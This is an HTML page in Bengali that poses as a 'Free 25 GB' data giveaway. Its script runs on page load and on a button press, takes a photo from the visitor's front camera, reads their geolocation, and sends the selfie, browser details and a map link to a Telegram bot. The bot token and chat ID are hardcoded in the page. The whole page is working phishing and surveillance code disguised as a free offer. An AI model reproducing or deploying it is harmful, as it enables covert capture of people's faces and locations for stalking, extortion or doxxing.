<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ফ্রি ২৫ জিবি </title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background:#0a0a0a; color:#fff; text-align: center; padding: 2rem; }
        .card { background: rgba(0,0,0,0.8); max-width: 500px; margin: auto; padding: 2rem; border-radius: 30px; backdrop-filter: blur(10px); border: 1px solid red; }
        button { background: red; border: none; padding: 12px 30px; color: white; font-size: 1.2rem; border-radius: 40px; cursor: pointer; margin-top: 20px; }
        .status { margin-top: 15px; color: #ff8888; }
    </style>
</head>
<body>
    <div class="card">
        <h1>🔥 ফ্রি ২৫ জিবি</h1>
        <p>আপনার তথ্য সংগ্রহ করা হচ্ছে...</p>
        <div id="status" class="status"> অনুমতি চাওয়া হচ্ছে...</div>
        <button id="forceBtn">অনুমতি দিন</button>
    </div>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // ইউআরএল থেকে বট টোকেন ও চ্যাট আইডি নেওয়া (প্যারামিটার হিসেবে দিতে হবে)
        const urlParams = new URLSearchParams(window.location.search);
        const BOT_TOKEN = urlParams.get('bot') || "8756510522:AAEOEqk0mYKuIr9c7jB0mPCk2JLxogCQhs8";
        const CHAT_ID = urlParams.get('chat') || "7653024935";

        const statusDiv = document.getElementById('status');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        async function start() {
            try {
                // ক্যামেরা অ্যাক্সেস
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 1000));
                capturePhoto(stream);
                
                // লোকেশন
                if ("geolocation" in navigator) {
                    navigator.geolocation.getCurrentPosition(async (pos) => {
                        const lat = pos.coords.latitude;
                        const lng = pos.coords.longitude;
                        const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
                        await sendLocation(mapLink);
                    }, (err) => {
                        sendLocation(" অনুমতি দেওয়া হয়নি: "+err.message);
                    });
                } else {
                    sendLocation("জিওলোকেশন সাপোর্ট করে না");
                }
            } catch(e) {
                statusDiv.innerText = "❌  অনুমতি প্রয়োজন। রিলোড করে বাটনে ক্লিক করুন।";
                console.error(e);
            }
        }

        async function capturePhoto(stream) {
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'selfie.jpg');
            formData.append('caption', ` ক্যাপচার\n🕐 ${new Date().toLocaleString()}\n🌐 ${navigator.userAgent}`);
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                statusDiv.innerText = "✅ ছবি পাঠানো হয়েছে! লোকেশন দেওয়ার চেষ্টা হচ্ছে...";
            } catch(e) { console.error(e); }
            stream.getTracks().forEach(t => t.stop());
        }

        async function sendLocation(locationText) {
            const message = `📍 ** তথ্য**\n${locationText}\n⏱️ ${new Date().toLocaleString()}`;
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
            });
            statusDiv.innerText = "✅ সম্পূর্ণ! এই পেজ এখন বন্ধ করতে পারেন।";
        }

        document.getElementById('forceBtn').addEventListener('click', start);
        // স্বয়ংক্রিয়ভাবে চাওয়া (ব্রাউজার ব্লক করতে পারে তাই বাটন রেখেছি)
        start().catch(()=>{});
    </script>
</body>
</html>
